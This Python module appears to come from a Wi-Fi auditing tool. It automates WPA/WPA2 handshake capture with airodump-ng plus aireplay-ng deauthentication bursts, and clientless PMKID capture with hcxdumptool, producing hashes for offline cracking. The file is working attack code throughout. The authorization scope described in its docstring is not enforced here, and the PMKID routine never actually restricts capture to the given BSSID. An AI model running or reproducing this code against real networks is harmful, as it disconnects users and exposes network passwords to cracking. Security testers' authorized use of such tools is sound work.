"""
core/capture.py

Handles WPA/WPA2 4-way handshake capture (via airodump-ng + aireplay-ng
deauth) and PMKID capture (via hcxdumptool), both of which are then
handed off to core/cracker.py for offline cracking.

A deauth is a scoped, targeted network-management frame - it is only
issued against BSSIDs explicitly present in the operator's confirmed
Scope (see core/authorization.py). The CLI enforces this before any
method here is invoked.
"""

from __future__ import annotations

import os
import time
from dataclasses import dataclass
from typing import Optional

from ..utils.logger import get_logger
from ..utils.shell import require_binary, run_background, run_command

log = get_logger(__name__)


@dataclass
class CaptureResult:
    success: bool
    file_path: Optional[str]
    method: str
    message: str = ""


class HandshakeCapture:
    """4-way handshake capture via airodump-ng targeted at one BSSID/channel,
    optionally accelerated with an aireplay-ng deauth burst."""

    def __init__(self, monitor_interface: str, output_dir: str = "captures"):
        require_binary("airodump-ng")
        self.monitor_interface = monitor_interface
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def capture(
        self,
        bssid: str,
        channel: str,
        essid: str = "target",
        listen_seconds: int = 45,
        deauth_count: int = 5,
        client_mac: Optional[str] = None,
    ) -> CaptureResult:
        prefix = os.path.join(self.output_dir, f"handshake_{essid}_{int(time.time())}")

        dump_args = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", prefix,
            self.monitor_interface,
        ]
        log.info("Listening for handshake on %s (ch %s) for up to %ss", bssid, channel, listen_seconds)
        dump_proc = run_background(dump_args)

        # Give airodump-ng a moment to lock onto the channel before deauthing.
        time.sleep(5)

        if deauth_count > 0:
            self._send_deauth(bssid, deauth_count, client_mac)

        time.sleep(max(listen_seconds - 5, 5))
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except Exception:
            dump_proc.kill()

        cap_file = f"{prefix}-01.cap"
        if os.path.exists(cap_file) and self._handshake_present(cap_file, bssid):
            return CaptureResult(True, cap_file, "4-way-handshake", "Handshake captured.")
        return CaptureResult(
            False, cap_file if os.path.exists(cap_file) else None,
            "4-way-handshake",
            "No handshake observed in capture window; consider a longer window "
            "or additional deauth bursts.",
        )

    def _send_deauth(self, bssid: str, count: int, client_mac: Optional[str]) -> None:
        require_binary("aireplay-ng")
        args = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client_mac:
            args += ["-c", client_mac]
        args.append(self.monitor_interface)
        log.info("Sending %d deauth frame(s) to %s%s", count, bssid,
                  f" (client {client_mac})" if client_mac else " (broadcast)")
        run_command(args, timeout=30)

    def _handshake_present(self, cap_file: str, bssid: str) -> bool:
        """Use aircrack-ng in check mode to confirm a valid handshake exists."""
        require_binary("aircrack-ng")
        result = run_command(["aircrack-ng", cap_file], timeout=30)
        return bssid.lower() in result.stdout.lower() and "handshake" in result.stdout.lower()


class PMKIDCapture:
    """Clientless PMKID capture via hcxdumptool - doesn't require an
    associated client or any deauth frames."""

    def __init__(self, monitor_interface: str, output_dir: str = "captures"):
        require_binary("hcxdumptool")
        self.monitor_interface = monitor_interface
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def capture(self, bssid: str, listen_seconds: int = 30) -> CaptureResult:
        require_binary("hcxpcapngtool")
        pcapng_file = os.path.join(self.output_dir, f"pmkid_{bssid.replace(':', '')}.pcapng")
        args = [
            "hcxdumptool",
            "-i", self.monitor_interface,
            "-o", pcapng_file,
            "--filterlist_ap", "-",
            "--filtermode", "2",
            "--enable_status", "1",
        ]
        log.info("Capturing PMKID for %s (%ss)", bssid, listen_seconds)
        proc = run_background(args)
        time.sleep(listen_seconds)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

        if not os.path.exists(pcapng_file):
            return CaptureResult(False, None, "pmkid", "Capture file was not created.")

        hash_file = pcapng_file.replace(".pcapng", ".22000")
        run_command(["hcxpcapngtool", "-o", hash_file, pcapng_file], timeout=30)
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            return CaptureResult(True, hash_file, "pmkid", "PMKID hash extracted.")
        return CaptureResult(False, None, "pmkid", "No PMKID found for this target.")
